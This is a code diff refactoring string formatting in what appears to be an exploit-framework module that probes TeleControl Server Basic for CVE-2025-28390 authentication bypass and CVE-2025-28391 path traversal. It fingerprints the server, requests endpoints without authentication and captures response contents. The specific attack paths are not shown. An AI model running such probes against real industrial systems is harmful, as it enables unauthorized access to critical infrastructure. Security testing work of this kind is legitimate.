@@ -59,17 +59,17 @@ from industrialxpl.core.exploit import (
 )
 
 
-def _http_get(host: str, port: int, path: str, timeout: int = 8) -> Optional[tuple[int, str]]:
+def _http_get(host: str, port: int, path: str, timeout: int = 8) -> tuple[int, str] | None:
     """Perform a raw HTTP GET and return (status_code, body_snippet)."""
     try:
         conn = socket.create_connection((host, port), timeout=timeout)
         conn.settimeout(timeout)
         request = (
-            "GET {} HTTP/1.1\r\n"
-            "Host: {}:{}\r\n"
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}:{port}\r\n"
             "Connection: close\r\n"
             "\r\n"
-        ).format(path, host, port).encode("latin-1")
+        ).encode("latin-1")
         conn.sendall(request)
         resp = b""
         while True:
@@ -96,7 +96,7 @@ def _http_get(host: str, port: int, path: str, timeout: int = 8) -> Optional[tup
         return None
 
 
-def _fingerprint_telecontrol(host: str, port: int) -> Optional[str]:
+def _fingerprint_telecontrol(host: str, port: int) -> str | None:
     """Try to read TeleControl Server version from HTTP banner or API."""
     result = _http_get(host, port, "/api/version")
     if result:
@@ -198,7 +198,7 @@ class Exploit(Exploit):
             return {}
 
         result: dict = {
-            "target": "{}:{}".format(self.target, self.port),
+            "target": f"{self.target}:{self.port}",
             "simulated": self.simulate,
             "auth_bypass_findings": [],
             "traversal_findings": [],
@@ -207,14 +207,10 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would probe TeleControl Server Basic at {}:{} for:\n"
-                    "  CVE-2025-28390: Unauthenticated GET to {} API endpoints\n"
-                    "  CVE-2025-28391: Path traversal via {} crafted URL paths\n"
-                    "  Any 200/200 response without auth header indicates vulnerability.".format(
-                        self.target, self.port,
-                        len(self._AUTH_BYPASS_PATHS),
-                        len(self._TRAVERSAL_PATHS) if self.check_traversal else 0,
-                    )
+                    f"Would probe TeleControl Server Basic at {self.target}:{self.port} for:\n"
+                    f"  CVE-2025-28390: Unauthenticated GET to {len(self._AUTH_BYPASS_PATHS)} API endpoints\n"
+                    f"  CVE-2025-28391: Path traversal via {len(self._TRAVERSAL_PATHS) if self.check_traversal else 0} crafted URL paths\n"
+                    "  Any 200/200 response without auth header indicates vulnerability."
                 ),
                 mitre_techniques=["T0883", "T0886"],
             )
@@ -226,28 +222,28 @@ class Exploit(Exploit):
         # Fingerprint
         banner = _fingerprint_telecontrol(str(self.target), int(self.port))
         if banner:
-            print_status("[TC-CVE-2025] TeleControl banner: {}".format(banner[:120]))
+            print_status(f"[TC-CVE-2025] TeleControl banner: {banner[:120]}")
         else:
             print_warning("[TC-CVE-2025] No TeleControl banner detected. Target may not be vulnerable or port is wrong.")
 
         # CVE-2025-28390: Authentication bypass probe
-        print_status("[TC-CVE-2025] Probing {} auth bypass endpoints...".format(len(self._AUTH_BYPASS_PATHS)))
+        print_status(f"[TC-CVE-2025] Probing {len(self._AUTH_BYPASS_PATHS)} auth bypass endpoints...")
         for path in self._AUTH_BYPASS_PATHS:
             res = _http_get(str(self.target), int(self.port), path, int(self.timeout))
             if res is None:
-                print_info("[TC-CVE-2025] {} - no response".format(path))
+                print_info(f"[TC-CVE-2025] {path} - no response")
                 continue
             status, body = res
             if status == 200 and body:
                 print_success(
-                    "[TC-CVE-2025] VULNERABLE (CVE-2025-28390): {} returned HTTP 200 "
-                    "without auth. Body snippet: {}".format(path, body[:80])
+                    f"[TC-CVE-2025] VULNERABLE (CVE-2025-28390): {path} returned HTTP 200 "
+                    f"without auth. Body snippet: {body[:80]}"
                 )
                 result["auth_bypass_findings"].append({"path": path, "status": status, "body": body[:80]})
             elif status in (401, 403):
-                print_info("[TC-CVE-2025] {} - HTTP {} (auth required - not bypassed)".format(path, status))
+                print_info(f"[TC-CVE-2025] {path} - HTTP {status} (auth required - not bypassed)")
             else:
-                print_info("[TC-CVE-2025] {} - HTTP {}".format(path, status))
+                print_info(f"[TC-CVE-2025] {path} - HTTP {status}")
 
         # CVE-2025-28391: Path traversal probe
         if self.check_traversal:
@@ -263,8 +259,8 @@ class Exploit(Exploit):
                 )
                 if is_traversal:
                     print_success(
-                        "[TC-CVE-2025] VULNERABLE (CVE-2025-28391): path traversal via {}. "
-                        "Content: {}".format(path, body[:80])
+                        f"[TC-CVE-2025] VULNERABLE (CVE-2025-28391): path traversal via {path}. "
+                        f"Content: {body[:80]}"
                     )
                     result["traversal_findings"].append({"path": path, "body": body[:80]})
 
